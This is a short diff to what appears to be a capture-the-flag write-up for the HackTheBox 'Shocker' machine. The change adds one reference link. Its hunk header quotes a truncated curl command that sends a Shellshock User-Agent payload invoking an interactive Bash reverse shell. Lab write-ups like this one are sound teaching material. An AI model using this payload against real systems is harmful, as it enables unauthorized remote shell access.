@@ -50,6 +50,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c4f85588-6979-435d-b7ef-466ca66b7e4d)
 
 # References & Alternatives:
++ https://vvmlist.github.io/#shock
 + https://0xdf.gitlab.io/2021/05/25/htb-shocker.html
 + https://infosecwriteups.com/shocker-from-hackthebox-52378519fb5b
 + https://corruptedprotocol.medium.com/shocker-hackthebox-htb-2cdac3cf3562
